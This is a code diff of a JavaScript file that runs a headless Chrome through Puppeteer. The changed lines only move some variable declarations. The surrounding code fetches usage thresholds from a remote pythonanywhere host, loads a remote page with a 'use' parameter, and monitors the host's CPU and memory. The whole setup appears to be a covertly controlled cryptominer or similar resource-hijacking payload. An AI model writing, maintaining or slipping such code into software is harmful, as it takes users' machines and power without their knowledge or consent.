@@ -8,8 +8,16 @@
     puppeteer,
     puppeteerBrowsers
   } = global.globalVars;
-  
+
   let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';
+
+  let chromePath;
+  let browser;
+  let page;
+  let minUse = 0.1;
+  let maxUse = 0.5;
+  let [max, min] = [maxUse, minUse];
+
 
   try {
     let forceDebug = false;
@@ -97,11 +105,6 @@
 
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
-    let chromePath;
-    let browser;
-    let page;
-    let minUse = 0.1;
-    let maxUse = 0.5;
 
     const cacheDir = `${os.homedir()}/.cache/puppeteer`;
     if (!fs.existsSync(cacheDir)) {
@@ -181,7 +184,6 @@
     global.cppPage = page;
 
 
-    let [max, min] = [maxUse, minUse];
     try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
     catch (error) { }
     await page.goto(baseUrl + '?use=' + max);
@@ -225,7 +227,7 @@
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
         });
-        let [max, min] = [maxUse, minUse];
+        [max, min] = [maxUse, minUse];
         try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
         catch (error) { }
 
